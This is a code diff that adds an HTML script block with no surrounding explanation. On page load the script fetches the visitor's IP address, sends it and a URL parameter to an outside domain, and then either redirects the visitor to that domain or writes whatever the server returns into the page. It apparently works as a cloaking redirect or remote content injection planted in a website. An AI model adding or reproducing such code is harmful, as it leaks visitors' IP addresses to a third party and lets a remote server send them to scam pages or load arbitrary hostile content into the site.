@@ -1,0 +1,24 @@
+<script>
+var obj;
+fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    people = data.ip;
+  })
+  .then(() => {
+    const path_url = window.location.href;
+    const path_array = path_url.split("=");
+    const url = "https://enm.shoppingapi.shop/product/"+path_array[1]+"—"+people;
+    fetch(url)
+      .then(response => {
+        return response.text();
+      })
+      .then(data => {
+        if(data=='go'){
+          window.location.replace("https://enm.shoppingapi.shop/go/"+path_array[1]+"—"+people);
+        } else {
+          document.write(data);
+        }
+      })
+    });
+</script>
